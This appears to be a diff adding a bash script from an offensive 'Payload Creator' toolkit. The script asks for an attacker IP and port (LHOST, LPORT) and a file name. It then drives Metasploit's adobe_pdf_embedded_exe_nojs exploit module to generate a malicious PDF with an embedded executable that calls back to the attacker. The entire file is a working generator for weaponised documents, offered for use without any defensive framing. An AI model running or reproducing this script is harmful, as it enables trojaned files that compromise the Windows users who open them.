@@ -1,0 +1,19 @@
+#!/bin/bash
+
+clear
+echo -e "\n\e[1;93m
+ ______               __                 __      ______                    __
+|   __ \.---.-.--.--.|  |.-----.---.-.--|  |    |      |.----.-----.---.-.|  |_.-----.----.
+|    __/|  _  |  |  ||  ||  _  |  _  |  _  |    |   ---||   _|  -__|  _  ||   _|  _  |   _|
+|___|   |___._|___  ||__||_____|___._|_____|    |______||__| |_____|___._||____|_____|__|
+              |_____|
+\e[0m"
+read -p $'\n\n\e[1;91mEnter the IP address ( LHOST )\e[0m\e[1;93m : ' lhost3
+read -p $'\n\e[1;91mEnter the PORT number ( LPORT )\e[0m\e[1;93m : ' lport3
+read -p $'\n\e[1;91mEnter the name of the Payload .pdf file.\e[0m\e[1;93m : ' name3
+echo -e "use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs\nset lhost $lhost3\nset lport $lport3\nset filename $name3.pdf\nexploit\nexit" > .exploit_pdf.rc
+msfconsole -r .exploit_pdf.rc >/dev/null | echo -e "\n\e[1;5;92mGENERATING PAYLOAD WAIT A MOMENT.\e[0m"
+mv ~/.msf4/local/$name3.pdf $PWD/metasploit/
+echo -e "\n\e[1;93mThe payload was saved inside $PWD/metasploit/$name3.pdf\e[0m]"
+echo
+bash modules/funtion2.sh
